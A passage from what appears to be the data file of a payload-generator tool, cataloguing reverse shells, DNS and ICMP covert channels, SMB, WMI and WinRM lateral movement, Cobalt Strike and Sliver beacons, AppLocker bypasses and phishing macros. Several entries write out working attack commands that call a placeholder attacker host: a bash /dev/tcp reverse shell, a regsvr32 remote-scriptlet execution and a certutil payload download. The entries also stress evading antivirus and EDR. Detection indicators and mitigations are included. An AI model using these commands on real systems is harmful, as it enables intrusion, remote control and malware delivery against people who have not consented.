    whatItDoes: 'Connects back to listener using a custom encryption algorithm (AES, XOR, etc.) to hide the payload.',
    howToUse: 'Generate with chosen encryption method, set up a corresponding decrypting listener.',
    whereToUse: 'When you need to avoid pattern‑based detection, for advanced persistent threats.',
    pros: ['Bypasses signature‑based AV', 'Customizable', 'Less known to security products'],
    cons: ['More complex to implement', 'Listener must support encryption', 'Can be reverse‑engineered'],
    icon: <Lock size={18} />,
    color: 'text-teal-400',
    defaultPort: 4444,
    requiresLhost: true,
    requiresLport: true,
    supportedFormats: ['python', 'csharp', 'go'],
    howItWorks: 'Encrypts the communication (e.g., with AES) before sending, and decrypts on the listener side.',
    exampleScenario: 'Use an AES‑encrypted reverse shell to exfiltrate data while evading network detection.',
    commonListenerCommand: 'Custom listener with decryption capability',
    detectionIndicators: [
      'Unusual entropy in network packets (high randomness)',
      'Processes performing cryptographic operations',
      'Custom protocols over non‑standard ports',
    ],
    mitigationTips: [
      'Deploy network traffic analysis with anomaly detection',
      'Monitor for unusual encryption patterns',
      'Implement host‑based detection for known encryption libraries',
    ],
    references: ['https://attack.mitre.org/techniques/T1573/'],
    isComplete: false,
    labVsReal: 'Encrypted shells are a staple of advanced labs and real red team operations. Real teams often use custom encryption to evade detection.',
    detectionComplexity: 'High',
    stealthRating: 'High',
    reliabilityRating: 'Medium',
  },
  // 15. Encoded PowerShell
  {
    type: 'powershell_encoded',
    name: 'Encoded PowerShell',
    category: 'Reverse Shells',
    description: 'PowerShell one‑liner with base64‑encoded command to bypass detection.',
    whatItDoes: 'Runs a base64‑encoded PowerShell script that downloads and executes a second stage.',
    howToUse: 'Generate the encoded command, then run it on target via cmd or PowerShell.',
    whereToUse: 'When you need a short, obfuscated command to deliver a payload via command line.',
    pros: ['Short and concise', 'Bypasses simple string detection', 'Widely usable in Windows'],
    cons: ['Base64 is easily decoded', 'Often flagged by EDR', 'Limited to PowerShell'],
    icon: <Code size={18} />,
    color: 'text-blue-400',
    defaultPort: 4444,
    requiresLhost: true,
    requiresLport: true,
    supportedFormats: ['powershell'],
    howItWorks: 'The payload is base64‑encoded to evade detection, then executed via powershell -EncodedCommand.',
    exampleScenario: 'Deliver an encoded PowerShell command via a phishing link that downloads and runs a reverse shell.',
    commonListenerCommand: 'nc -lvnp ${lport} (for the second stage)',
    detectionIndicators: [
      'PowerShell command line with -EncodedCommand',
      'Suspicious base64 strings in command line',
      'PowerShell spawning network connections',
    ],
    mitigationTips: [
      'Log and monitor PowerShell command lines',
      'Enable PowerShell script block logging',
      'Block PowerShell if not needed',
    ],
    references: ['https://attack.mitre.org/techniques/T1059.001/'],
    isComplete: false,
    labVsReal: 'Encoded PowerShell is a common lab technique and still appears in real phishing and initial access campaigns, though modern EDR often detects it.',
    detectionComplexity: 'Medium',
    stealthRating: 'Low',
    reliabilityRating: 'Medium',
  },
  // 16. C# Loader
  {
    type: 'csharp_loader',
    name: 'C# Loader',
    category: 'Reverse Shells',
    description: 'C# executable that loads and executes shellcode — a modern EDR evasion staple.',
    whatItDoes: 'A compiled .NET executable that uses Windows API to allocate memory, copy shellcode, and execute it.',
    howToUse: 'Generate the loader, compile it, and run it on the target.',
    whereToUse: 'When you need a small, custom executable to bypass AV by using shellcode.',
    pros: ['Bypasses some AV', 'Can be obfuscated', 'Works on Windows'],
    cons: ['Requires .NET Framework', 'May be flagged by EDR', 'Larger than raw shellcode'],
    icon: <FileCode size={18} />,
    color: 'text-blue-300',
    defaultPort: 4444,
    requiresLhost: true,
    requiresLport: true,
    supportedFormats: ['csharp'],
    howItWorks: 'C# code uses VirtualAlloc, Marshal.Copy, and CreateThread to execute shellcode.',
    exampleScenario: 'Compile a C# loader that injects Meterpreter shellcode into memory to evade file‑based detection.',
    commonListenerCommand: 'nc -lvnp ${lport} (if shellcode connects back)',
    detectionIndicators: [
      'Processes with RWX memory regions',
      'Unusual .NET assemblies loaded',
      'API calls to VirtualAlloc and CreateThread',
    ],
    mitigationTips: [
      'Enable AMSI and .NET ETW monitoring',
      'Use EDR that can detect shellcode injection',
      'Restrict execution of unsigned .NET executables',
    ],
    references: ['https://attack.mitre.org/techniques/T1055/'],
    isComplete: false,
    labVsReal: 'C# loaders are extremely common in both labs and real red team operations. They are a go-to technique for executing shellcode in memory while evading disk-based detection.',
    detectionComplexity: 'High',
    stealthRating: 'High',
    reliabilityRating: 'High',
  },
  // 17. DNS Shell
  {
    type: 'dns_shell',
    name: 'DNS Shell',
    category: 'Covert Channels',
    description: 'Exfiltrates data and receives commands via DNS queries — the ultimate stealth channel.',
    whatItDoes: 'Uses DNS requests to send and receive data, tunnelling shell commands through DNS.',
    howToUse: 'Set up a DNS server (or use a service like dnscat2), generate the payload, run it on target.',
    whereToUse: 'When outbound HTTP/HTTPS is blocked but DNS is allowed (many networks allow DNS).',
    pros: ['Bypasses many firewalls', 'Uses a very common protocol', 'Difficult to block'],
    cons: ['Can be slow', 'Requires a DNS server you control', 'May be detected by DNS monitoring'],
    icon: <Network size={18} />,
    color: 'text-cyan-300',
    defaultPort: 53,
    requiresLhost: true,
    requiresLport: false,
    supportedFormats: ['python', 'csharp', 'go'],
    howItWorks: 'The payload encodes commands in DNS queries (e.g., subdomain lookups) and extracts responses from DNS answers.',
    exampleScenario: 'Use a DNS shell to maintain access on a network that allows only DNS outbound.',
    commonListenerCommand: 'dnscat2-server --dns "domain.com"',
    detectionIndicators: [
      'Frequent DNS queries with long subdomain names',
      'DNS TXT records with unusual content',
      'High volume of DNS traffic from a single host',
    ],
    mitigationTips: [
      'Monitor DNS traffic for anomalies (e.g., long subdomains, high query rates)',
      'Use DNS security solutions (e.g., Cisco Umbrella)',
      'Restrict which internal servers can perform external DNS lookups',
    ],
    references: ['https://attack.mitre.org/techniques/T1572/'],
    isComplete: false,
    labVsReal: 'DNS shells are a classic lab technique and are still used in real red team operations, especially in environments with strict egress filtering.',
    detectionComplexity: 'High',
    stealthRating: 'High',
    reliabilityRating: 'Medium',
  },
  // 18. ICMP Shell
  {
    type: 'icmp_shell',
    name: 'ICMP Shell',
    category: 'Covert Channels',
    description: 'Uses ICMP (ping) packets to establish a covert channel — noisy but effective.',
    whatItDoes: 'Sends and receives commands encapsulated in ICMP echo requests/replies.',
    howToUse: 'Set up an ICMP listener (e.g., using icmpsh or custom script), generate payload, run on target.',
    whereToUse: 'When TCP and UDP are restricted, ICMP may be allowed.',
    pros: ['Many firewalls allow ICMP', 'Covert channel', 'Simple to implement'],
    cons: ['Limited bandwidth', 'Can be detected by anomaly detection', 'No built‑in encryption'],
    icon: <Activity size={18} />,
    color: 'text-yellow-400',
    defaultPort: 0,
    requiresLhost: true,
    requiresLport: false,
    supportedFormats: ['python', 'csharp', 'go'],
    howItWorks: 'The payload reads commands from incoming ICMP packets and sends back output via ICMP replies.',
    exampleScenario: 'Use ICMP shell to exfiltrate data from a network that only allows ping traffic.',
    commonListenerCommand: 'icmpsh -t ${lhost} -l <your-ip>',
    detectionIndicators: [
      'ICMP packets with data payload (non‑standard)',
      'High volume of ICMP traffic',
      'ICMP requests and replies with unusual patterns',
    ],
    mitigationTips: [
      'Block ICMP where not needed (or limit to internal use)',
      'Monitor ICMP traffic for anomalies (e.g., large payloads)',
      'Use network monitoring to detect covert channels',
    ],
    references: ['https://attack.mitre.org/techniques/T1572/'],
    isComplete: false,
    labVsReal: 'ICMP shells are a fun lab technique but are rarely used in real engagements due to their noise and limited bandwidth.',
    detectionComplexity: 'Medium',
    stealthRating: 'Low',
    reliabilityRating: 'Low',
  },
  // 19. SMB Shell
  {
    type: 'smb_shell',
    name: 'SMB Shell',
    category: 'Lateral Movement',
    description: 'Uses SMB named pipes to create a command channel — lateral movement classic.',
    whatItDoes: 'Establishes a reverse or bind shell over SMB protocol using named pipes.',
    howToUse: 'Requires SMB access to the target. Use tools like smbexec or psexec.',
    whereToUse: 'When you have valid credentials and SMB is open, for lateral movement.',
    pros: ['Leverages built‑in Windows services', 'Works over port 445 (often open)', 'Can be used for pivoting'],
    cons: ['Requires authentication', 'Often logged', 'Limited to Windows environments'],
    icon: <Database size={18} />,
    color: 'text-green-400',
    defaultPort: 445,
    requiresLhost: true,
    requiresLport: false,
    supportedFormats: ['csharp', 'python'],
    howItWorks: 'Uses SMB named pipes to send commands and receive output, mimicking administrative tools.',
    exampleScenario: 'Use SMB shell to move laterally after compromising a domain account.',
    commonListenerCommand: 'smbexec.py Administrator:Password@${lhost}',
    detectionIndicators: [
      'SMB login events (Event ID 4624/4625) from unusual source IPs',
      'Named pipe creation related to command execution',
      'Service creations via SMB',
    ],
    mitigationTips: [
      'Restrict SMB to only required hosts and users',
      'Enable SMB signing and auditing',
      'Monitor for SMB lateral movement indicators',
    ],
    references: ['https://attack.mitre.org/techniques/T1021/'],
    isComplete: false,
    labVsReal: 'SMB shells are a core technique for lateral movement in both labs and real Windows enterprise environments.',
    detectionComplexity: 'Medium',
    stealthRating: 'Medium',
    reliabilityRating: 'High',
  },
  // 20. SSH Shell
  {
    type: 'ssh_shell',
    name: 'SSH Reverse Tunnel',
    category: 'Lateral Movement',
    description: 'Creates a reverse SSH tunnel to establish a shell — a Linux administrator\'s friend.',
    whatItDoes: 'Uses SSH to create a tunnel back to your machine, giving you a shell.',
    howToUse: 'Run the SSH command with -R to forward a remote port to your machine.',
    whereToUse: 'When SSH outbound is allowed, for persistence or to bypass firewalls.',
    pros: ['Secure (encrypted)', 'Uses standard SSH', 'Easy to set up'],
    cons: ['Requires SSH client', 'May be restricted by policy', 'Requires valid credentials or key'],
    icon: <Key size={18} />,
    color: 'text-gray-400',
    defaultPort: 22,
    requiresLhost: true,
    requiresLport: true,
    supportedFormats: ['bash', 'python', 'go'],
    howItWorks: 'The payload establishes a reverse SSH tunnel using command: ssh -R <local_port>:localhost:22 <your_server>.',
    exampleScenario: 'Use SSH reverse tunnel to gain access to an internal server from the internet.',
    commonListenerCommand: 'ssh -R ${lport}:localhost:22 user@${lhost}',
    detectionIndicators: [
      'SSH connections with port forwarding (-R)',
      'Unusual SSH command line arguments',
      'SSH sessions from internal hosts to external IPs',
    ],
    mitigationTips: [
      'Restrict SSH port forwarding (PermitTunnel no)',
      'Monitor SSH logs for forwarding requests',
      'Use egress filtering to block SSH to unknown external hosts',
    ],
    references: ['https://attack.mitre.org/techniques/T1572/'],
    isComplete: true,
    labVsReal: 'SSH reverse tunnels are common in both labs and real Linux environments. They\'re a reliable way to get access when SSH is available.',
    detectionComplexity: 'Medium',
    stealthRating: 'Medium',
    reliabilityRating: 'High',
  },
  // 21. PowerShell (Plain)
  {
    type: 'powershell_plain',
    name: 'PowerShell Reverse Shell (Plain)',
    category: 'Reverse Shells',
    description: 'A simple, unencoded PowerShell reverse shell — the original.',
    whatItDoes: 'Opens a TCP connection and provides a command shell via PowerShell.',
    howToUse: 'Run the command directly in PowerShell or cmd.',
    whereToUse: 'When you need a quick, simple reverse shell on Windows.',
    pros: ['Easy to remember', 'No external tools', 'Fast to deploy'],
    cons: ['Plaintext traffic', 'Easy to detect', 'Often flagged by AV/EDR'],
    icon: <Terminal size={18} />,
    color: 'text-blue-300',
    defaultPort: 4444,
    requiresLhost: true,
    requiresLport: true,
    supportedFormats: ['powershell'],
    howItWorks: 'Uses .NET TCPClient to connect back and execute commands.',
    exampleScenario: 'Quickly get a shell on a Windows machine during a penetration test.',
    commonListenerCommand: 'nc -lvnp ${lport}',
    detectionIndicators: [
      'PowerShell command line with clear text IP/port',
      'PowerShell spawning network connections',
      'Suspicious function names (TCPClient, GetStream)',
    ],
    mitigationTips: [
      'Enable PowerShell logging (ScriptBlock, Module)',
      'Monitor for unusual PowerShell commands',
      'Use AMSI to block known malicious scripts',
    ],
    references: ['https://attack.mitre.org/techniques/T1059.001/'],
    isComplete: true,
    labVsReal: 'The classic PowerShell reverse shell is a lab staple but is rarely used in real engagements due to its high detection rate.',
    detectionComplexity: 'Low',
    stealthRating: 'Low',
    reliabilityRating: 'High',
  },
  // 22. Bash Reverse Shell
  {
    type: 'bash_reverse',
    name: 'Bash Reverse Shell',
    category: 'Reverse Shells',
    description: 'Classic bash reverse shell using /dev/tcp — the Linux lab workhorse.',
    whatItDoes: 'Uses bash built‑in /dev/tcp to connect back and spawn a shell.',
    howToUse: 'Run the command directly on a Linux target.',
    whereToUse: 'Linux environments, when you have command execution.',
    pros: ['Very simple', 'No external dependencies', 'Works on most Linux distributions'],
    cons: ['Plaintext', 'Easily detected', 'May not work on systems without /dev/tcp'],
    icon: <Terminal size={18} />,
    color: 'text-emerald-300',
    defaultPort: 4444,
    requiresLhost: true,
    requiresLport: true,
    supportedFormats: ['bash'],
    howItWorks: 'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1',
    exampleScenario: 'Quickly get a shell on a compromised Linux server.',
    commonListenerCommand: 'nc -lvnp ${lport}',
    detectionIndicators: [
      'Bash command with /dev/tcp redirection',
      'Network connections from bash process',
      'Suspicious use of file descriptors (>&)',
    ],
    mitigationTips: [
      'Monitor for anomalous bash commands',
      'Restrict outbound network access from servers',
      'Use auditd to log command execution',
    ],
    references: ['https://attack.mitre.org/techniques/T1059/'],
    isComplete: true,
    labVsReal: 'The bash /dev/tcp reverse shell is a lab classic. In real engagements, it\'s often used as a quick fallback when more sophisticated C2 is not available.',
    detectionComplexity: 'Low',
    stealthRating: 'Low',
    reliabilityRating: 'High',
  },
  // 23. WMI Shell
  {
    type: 'wmi_shell',
    name: 'WMI Lateral Shell',
    category: 'Lateral Movement',
    description: 'Executes commands on remote hosts using Windows Management Instrumentation (WMI).',
    whatItDoes: 'Uses WMI (Win32_Process.Create) to spawn processes on a remote Windows host with admin credentials.',
    howToUse: 'Requires local admin or domain credentials. Run from a Windows machine with WMI access.',
    whereToUse: 'Lateral movement in Active Directory environments where SMB/RPC are restricted.',
    pros: ['Uses WMI (legitimate admin tool)', 'No file dropped on disk', 'Hard to detect without specific logging'],
    cons: ['Requires local admin or equivalent', 'Heavily logged if WMI auditing is enabled', 'Windows only'],
    icon: <Activity size={18} />,
    color: 'text-violet-400',
    defaultPort: 135,
    requiresLhost: false,
    requiresLport: false,
    supportedFormats: ['powershell', 'csharp', 'vba'],
    howItWorks: 'Connects to remote host via DCOM, instantiates WMI process, spawns cmd.exe with credentials, returns output via redirected file share.',
    exampleScenario: 'Use wmiexec.py or Invoke-WmiCommand after compromising a domain admin to pivot to a file server.',
    commonListenerCommand: 'wmiexec.py Administrator:Password@${lhost}',
    detectionIndicators: [
      'WMI activity (Event ID 5861) from unusual sources',
      'Child processes of WmiPrvSe.exe',
      'DCOM/RPC traffic from admin workstations to servers',
    ],
    mitigationTips: [
      'Restrict DCOM access via GPO',
      'Enable WMI logging (WMI_Activity)',
      'Use LAPS to randomize local admin passwords',
    ],
    references: ['https://attack.mitre.org/techniques/T1047/', 'https://www.rapid7.com/blog/post/2013/03/09/abusing-windows-management-instrumentation-wmi-to-build-a-persistent-asyncronous-network-f/'],
    isComplete: false,
    labVsReal: 'WMI shells are a key lateral movement technique in both labs and real Windows enterprise environments, often used as an alternative to SMB-based methods.',
    detectionComplexity: 'High',
    stealthRating: 'Medium',
    reliabilityRating: 'High',
  },
  // 24. WinRM Shell
  {
    type: 'winrm_shell',
    name: 'WinRM / PSRemoting',
    category: 'Lateral Movement',
    description: 'PowerShell remoting over WinRM (port 5985/5986) — the modern admin\'s tool.',
    whatItDoes: 'Uses Microsoft\'s WS-Management protocol to execute PowerShell on a remote host.',
    howToUse: 'Requires admin credentials and WinRM enabled. Use Invoke-Command or Enter-PSSession.',
    whereToUse: 'Lateral movement in modern Windows environments where PSRemoting is enabled.',
    pros: ['Native to Windows', 'Encrypted by default', 'No agent required'],
    cons: ['Requires WinRM enabled', 'Heavily logged', 'Only Windows'],
    icon: <Terminal size={18} />,
    color: 'text-blue-400',
    defaultPort: 5985,
    requiresLhost: false,
    requiresLport: false,
    supportedFormats: ['powershell', 'csharp'],
    howItWorks: 'Connects to remote WinRM endpoint over HTTP/HTTPS, authenticates via Kerberos/NTLM, executes PowerShell via WSMan.',
    exampleScenario: 'Use Enter-PSSession to move laterally to a domain controller after compromising domain admin.',
    commonListenerCommand: 'Invoke-Command -ComputerName ${lhost} -ScriptBlock { whoami } -Credential $cred',
    detectionIndicators: [
      'WinRM connections (Event ID 91)',
      'PowerShell remoting activity in logs',
      'Network connections to port 5985/5986 from unusual sources',
    ],
    mitigationTips: [
      'Restrict WinRM via firewall and GPO',
      'Use Just Enough Administration (JEA)',
      'Enable PowerShell remoting logging',
    ],
    references: ['https://attack.mitre.org/techniques/T1021/006/', 'https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/winrmsecurity'],
    isComplete: false,
    labVsReal: 'WinRM is increasingly used in real engagements as organizations adopt PowerShell remoting for administration, making it a reliable lateral movement technique.',
    detectionComplexity: 'Medium',
    stealthRating: 'Medium',
    reliabilityRating: 'High',
  },
  // 25. Cobalt Strike Beacon
  {
    type: 'cobalt_strike_beacon',
    name: 'Cobalt Strike Beacon',
    category: 'C2 Frameworks',
    description: 'Commercial C2 beacon with malleable C2 profiles — the red team standard.',
    whatItDoes: 'Establishes a C2 channel with sleep mask, malleable C2 profile, and post-exploitation features.',
    howToUse: 'Generate via Cobalt Strike Arsenal → Host on team server → Execute on target → Interact via beacon console.',
    whereToUse: 'Red team engagements, advanced persistent threat simulations.',
    pros: ['Highly customizable', 'Malleable C2 profiles', 'Extensive post-exploitation modules', 'Active community'],
    cons: ['Commercial (paid)', 'Heavily signatured', 'Requires team server setup'],
    icon: <Shield size={18} />,
    color: 'text-orange-400',
    defaultPort: 4444,
    requiresLhost: true,
    requiresLport: true,
    supportedFormats: ['csharp', 'powershell', 'python'],
    howItWorks: 'Beacon uses HTTP/HTTPS/DNS with sleep/jitter patterns. C2 profile defines traffic shape. Uses reflective DLL injection.',
    exampleScenario: 'Deploy Beacon to maintain persistent access across a large enterprise network with multiple C2 channels.',
    commonListenerCommand: './teamserver ${lhost} password',
    detectionIndicators: [
      'Known Beacon patterns in memory',
      'Named pipe creation (\\\\\\\\.\\\\pipe\\\\MSSE-*)',
      'Sleep/jitter patterns in network traffic',
    ],
    mitigationTips: [
      'Use EDR with Beacon detection signatures',
      'Monitor for known named pipe patterns',
      'Implement network traffic analysis for Beacon patterns',
    ],
    references: ['https://attack.mitre.org/software/S0154/', 'https://www.cobaltstrike.com/'],
    isComplete: false,
    labVsReal: 'Cobalt Strike is the gold standard for real red team operations. It\'s heavily used in professional engagements and is the benchmark for C2 frameworks.',
    detectionComplexity: 'High',
    stealthRating: 'High',
    reliabilityRating: 'High',
  },
  // 26. Sliver Beacon
  {
    type: 'sliver_beacon',
    name: 'Sliver C2 Beacon',
    category: 'C2 Frameworks',
    description: 'Open-source cross-platform C2 framework similar to Cobalt Strike.',
    whatItDoes: 'Cross-platform C2 beacon with DNS, HTTPS, and WG (WireGuard) C2 channels.',
    howToUse: 'Setup Sliver server → Generate implant → Execute on target → Interact via CLI',
    whereToUse: 'Red team engagements, open-source C2 operations.',
    pros: ['Open-source and free', 'Cross-platform (Windows/macOS/Linux)', 'WireGuard support', 'Active development'],
    cons: ['Less mature than Cobalt Strike', 'Smaller community', 'Less extensive module library'],
    icon: <Network size={18} />,
    color: 'text-cyan-400',
    defaultPort: 443,
    requiresLhost: true,
    requiresLport: true,
    supportedFormats: ['csharp', 'python', 'go'],
    howItWorks: 'Implant uses encrypted C2 channels with multiple protocols. Supports session management, pivoting, and post-exploitation.',
    exampleScenario: 'Use Sliver for an open-source red team exercise to maintain access across multiple platforms.',
    commonListenerCommand: 'sliver-server --http --lhost ${lhost}',
    detectionIndicators: [
      'Known Sliver patterns in memory',
      'WireGuard traffic anomalies',
      'Encrypted C2 traffic patterns',
    ],
    mitigationTips: [
      'Monitor for known Sliver signatures',
      'Implement network traffic analysis',
      'Use EDR with behavioral detection',
    ],
    references: ['https://github.com/BishopFox/sliver', 'https://attack.mitre.org/software/S0633/'],
    isComplete: false,
    labVsReal: 'Sliver is gaining popularity in both labs and real engagements as a free, open-source alternative to Cobalt Strike.',
    detectionComplexity: 'High',
    stealthRating: 'High',
    reliabilityRating: 'High',
  },
  // 27. macOS Reverse Shell
  {
    type: 'macos_reverse',
    name: 'macOS Reverse Shell',
    category: 'Reverse Shells',
    description: 'Reverse shell tailored for macOS using native commands and Python.',
    whatItDoes: 'Opens a reverse shell connection from macOS target to your listener using bash or Python.',
    howToUse: 'Generate and execute on macOS target. Works with standard netcat listener.',
    whereToUse: 'macOS environments, post-exploitation on Apple systems.',
    pros: ['Works on modern macOS', 'Uses built-in Python', 'No additional dependencies'],
    cons: ['Plaintext', 'macOS security features may block', 'Requires terminal access'],
    icon: <ShieldAlert size={18} />,
    color: 'text-gray-400',
    defaultPort: 4444,
    requiresLhost: true,
    requiresLport: true,
    supportedFormats: ['bash', 'python', 'go'],
    howItWorks: 'Uses Python\'s socket, subprocess, and os modules to spawn a shell over TCP.',
    exampleScenario: 'After compromising a macOS machine, establish a reverse shell to maintain access.',
    commonListenerCommand: 'nc -lvnp ${lport}',
    detectionIndicators: [
      'Network connections from Python/bash processes',
      'Suspicious terminal activity',
      'Unauthorized network connections',
    ],
    mitigationTips: [
      'Enable macOS firewall and application-level controls',
      'Monitor network connections using lsof',
      'Use endpoint detection tools (EDR)',
    ],
    references: ['https://attack.mitre.org/techniques/T1059/'],
    isComplete: true,
    labVsReal: 'macOS reverse shells are common in labs and are increasingly used in real engagements as macOS becomes more prevalent in enterprise environments.',
    detectionComplexity: 'Medium',
    stealthRating: 'Low',
    reliabilityRating: 'High',
  },
  // 28. MSBuild AppLocker Bypass
  {
    type: 'msbuild_applocker_bypass',
    name: 'MSBuild AppLocker Bypass',
    category: 'AppLocker / EDR Bypass',
    description: 'Uses MSBuild.exe to execute C# code and bypass AppLocker — a LOLBin classic.',
    whatItDoes: 'Leverages MSBuild.exe (trusted Microsoft binary) to run inline C# code.',
    howToUse: 'Create an XML .csproj file with inline C# code, execute via msbuild.exe.',
    whereToUse: 'AppLocker bypass, executing code in restricted Windows environments.',
    pros: ['Uses trusted Microsoft binary', 'Bypasses AppLocker', 'No new process created'],
    cons: ['Requires .NET Framework', 'May be flagged by EDR', 'Limited to Windows'],
    icon: <Hammer size={18} />,
    color: 'text-blue-400',
    defaultPort: 4444,
    requiresLhost: true,
    requiresLport: true,
    supportedFormats: ['csharp', 'xml'],
    howItWorks: 'MSBuild.exe compiles and executes C# code from .csproj file, evading AppLocker rules.',
    exampleScenario: 'Execute a Meterpreter payload on a locked-down Windows system using MSBuild.',
    commonListenerCommand: 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe payload.csproj',
    detectionIndicators: [
      'MSBuild.exe spawning child processes',
      'MSBuild.exe making network connections',
      'Unusual .csproj files in temp directories',
    ],
    mitigationTips: [
      'Monitor MSBuild.exe activity',
      'Enable AppLocker logging',
      'Restrict MSBuild execution via WDAC',
    ],
    references: ['https://attack.mitre.org/techniques/T1127/', 'https://www.trustedsec.com/blog/abusing-msbuild-to-bypass-applocker-and-execute-payloads/'],
    isComplete: false,
    labVsReal: 'MSBuild bypass is a common lab technique and still appears in real engagements targeting locked-down Windows environments.',
    detectionComplexity: 'Medium',
    stealthRating: 'Medium',
    reliabilityRating: 'High',
  },
  // 29. Regsvr32 Squiblydoo
  {
    type: 'regsvr32_squiblydoo',
    name: 'Regsvr32 Squiblydoo',
    category: 'AppLocker / EDR Bypass',
    description: 'Uses regsvr32.exe to download and execute a COM scriptlet — a LOLBin classic.',
    whatItDoes: 'Executes code via regsvr32.exe using scriptlet (SCT) files from remote server.',
    howToUse: 'Host an SCT file, run regsvr32 /s /u /i:http://server/payload.sct scrobj.dll',
    whereToUse: 'AppLocker bypass, executing code in restricted Windows environments.',
    pros: ['Uses trusted Windows binary', 'Bypasses AppLocker', 'Executes from memory'],
    cons: ['May be flagged by EDR', 'Requires internet access', 'Limited to Windows'],
    icon: <Hash size={18} />,
    color: 'text-yellow-400',
    defaultPort: 80,
    requiresLhost: true,
    requiresLport: false,
    supportedFormats: ['javascript', 'xml'],
    howItWorks: 'regsvr32.exe loads scrobj.dll which processes the SCT file, executing JavaScript/VBScript code.',
    exampleScenario: 'Bypass AppLocker to execute a PowerShell payload using regsvr32.exe.',
    commonListenerCommand: 'regsvr32 /s /u /i:http://${lhost}/payload.sct scrobj.dll',
    detectionIndicators: [
      'regsvr32.exe with /i flag to external URLs',
      'regsvr32.exe spawning child processes',
      'Network connections from regsvr32.exe',
    ],
    mitigationTips: [
      'Monitor regsvr32.exe activity',
      'Enable AppLocker logging',
      'Block regsvr32.exe using WDAC',
    ],
    references: ['https://attack.mitre.org/techniques/T1218/', 'https://www.trustedsec.com/blog/squiblydoo/'],
    isComplete: false,
    labVsReal: 'Squiblydoo is a common lab bypass technique and still appears in real engagements targeting AppLocker-restricted environments.',
    detectionComplexity: 'Medium',
    stealthRating: 'Medium',
    reliabilityRating: 'High',
  },
  // 30. Certutil Downloader
  {
    type: 'certutil_downloader',
    name: 'Certutil Downloader',
    category: 'AppLocker / EDR Bypass',
    description: 'Uses certutil.exe to download and decode files — a classic LOLBin.',
    whatItDoes: 'Leverages certutil.exe to download files, decode base64, and execute payloads.',
    howToUse: 'Host payload (base64 encoded), run certutil -urlcache -f http://server/payload.b64 payload.b64',
    whereToUse: 'LOLBin technique, downloading files in restricted environments.',
    pros: ['Uses trusted Windows binary', 'Can decode base64', 'Built-in to Windows'],
    cons: ['Logs activity', 'May be flagged by EDR', 'Visible in command line'],
    icon: <Download size={18} />,
    color: 'text-green-400',
    defaultPort: 80,
    requiresLhost: true,
    requiresLport: false,
    supportedFormats: ['batch', 'powershell'],
    howItWorks: 'certutil.exe downloads files via HTTP and can decode base64 using -decode flag.',
    exampleScenario: 'Download a base64-encoded payload and decode it to an executable on a restricted Windows system.',
    commonListenerCommand: 'certutil -urlcache -f http://${lhost}/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe',
    detectionIndicators: [
      'certutil.exe with -urlcache flag',
      'certutil.exe downloading from external sources',
      'certutil.exe decoding files',
    ],
    mitigationTips: [
      'Monitor certutil.exe activity',
      'Block certutil.exe network access if not needed',
      'Enable command line logging',
    ],
    references: ['https://attack.mitre.org/techniques/T1105/', 'https://lolbas-project.github.io/lolbas/Binaries/Certutil/'],
    isComplete: false,
    labVsReal: 'Certutil is a common lab downloader and is still used in real engagements as a quick way to fetch payloads on Windows.',
    detectionComplexity: 'Low',
    stealthRating: 'Low',
    reliabilityRating: 'High',
  },
  // 31. Excel 4.0 Macro
  {
    type: 'excel4_macro',
    name: 'Excel 4.0 Macro (XLM)',
    category: 'Initial Access / Phishing',
    description: 'Legacy Excel 4.0 macros for phishing and initial access — the old-school trick.',
    whatItDoes: 'Uses Excel 4.0 macro language to execute commands, evading modern security controls.',
    howToUse: 'Embed in Excel file, send via phishing, victim opens and enables macros.',
    whereToUse: 'Phishing campaigns, bypassing macro detection controls.',
    pros: ['Bypasses many macro controls', 'Legacy format not always monitored', 'Highly effective'],
    cons: ['Requires user interaction', 'May be flagged by some security tools', 'Limited capabilities'],
    icon: <FileCode size={18} />,
    color: 'text-emerald-400',
    defaultPort: 4444,
    requiresLhost: true,
    requiresLport: true,
    supportedFormats: ['vba', 'javascript'],
    howItWorks: 'Uses Excel 4.0 macro functions like EXEC and RUN to execute commands or download payloads.',
    exampleScenario: 'Deliver an Excel 4.0 macro via phishing that downloads and executes a reverse shell payload.',
    commonListenerCommand: 'nc -lvnp ${lport} (for downloaded payload)',
    detectionIndicators: [
      'Excel 4.0 macro warning',
      'Excel spawning child processes',
      'Network connections from Excel',
    ],
    mitigationTips: [
      'Disable Excel 4.0 macros via GPO',
      'Monitor Excel process activity',
      'Use Office 365 advanced threat protection',
    ],
    references: ['https://attack.mitre.org/techniques/T1059/', 'https://blog.wooledge.org/2022/03/15/excel-4-0-macros-are-back/'],
    isComplete: false,
    labVsReal: 'Excel 4.0 macros are a common lab and real-world phishing technique, especially as organizations have gotten better at detecting VBA macros.',
    detectionComplexity: 'High',
    stealthRating: 'Low',
    reliabilityRating: 'Medium',
  },
  // 32. DDE Injection
  {
    type: 'dde_injection',
    name: 'Office DDE Injection',
    category: 'Initial Access / Phishing',
    description: 'Uses DDE (Dynamic Data Exchange) to execute commands in Office documents.',
    whatItDoes: 'Uses DDE fields in Office documents to execute commands when opened.',
    howToUse: 'Craft Office document with DDE field, send via phishing, victim opens.',
    whereToUse: 'Phishing, bypassing macro restrictions.',
    pros: ['Bypasses macro restrictions', 'Simple to implement', 'Works on older Office'],
    cons: ['Modern Office has DDE warnings', 'May be flagged by security tools', 'Requires user interaction'],
    icon: <Plus size={18} />,
    color: 'text-purple-400',
    defaultPort: 4444,
    requiresLhost: true,
    requiresLport: true,
    supportedFormats: ['powershell', 'vba'],
    howItWorks: 'DDE field in Word/Excel executes command via cmd.exe when document opens.',
    exampleScenario: 'Send a Word document with DDE field that executes a PowerShell reverse shell.',
    commonListenerCommand: 'nc -lvnp ${lport}',
    detectionIndicators: [
      'Office processes spawning cmd.exe',
      'DDE field warnings in Office',
      'Unusual network connections from Office',
    ],
    mitigationTips: [
      'Disable DDE in Office via GPO',
      'Monitor Office process activity',
      'Use Office 365 advanced threat protection',
    ],
    references: ['https://attack.mitre.org/techniques/T1059/', 'https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/'],
    isComplete: false,
    labVsReal: 'DDE injection is a classic lab technique and was widely used in real phishing campaigns before Microsoft added protections.',
    detectionComplexity: 'Medium',
    stealthRating: 'Low',
    reliabilityRating: 'Low',
  },
  // 33. Donut Shellcode Generator
  {
    type: 'donut_shellcode',
    name: 'Donut Shellcode',
    category: 'AppLocker / EDR Bypass',
